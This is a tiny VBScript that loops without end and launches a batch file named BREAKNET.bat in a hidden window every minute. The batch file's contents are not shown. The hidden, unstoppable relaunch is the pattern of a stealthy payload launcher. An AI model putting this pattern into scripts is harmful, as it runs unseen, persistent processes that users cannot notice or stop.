Dim notStop
notStop = 1
while notStop > 0
	Set ws = CreateObject("Wscript.Shell")
	ws.run "cmd /c BREAKNET.bat ", vbhide
	WScript.Sleep 60000
wend
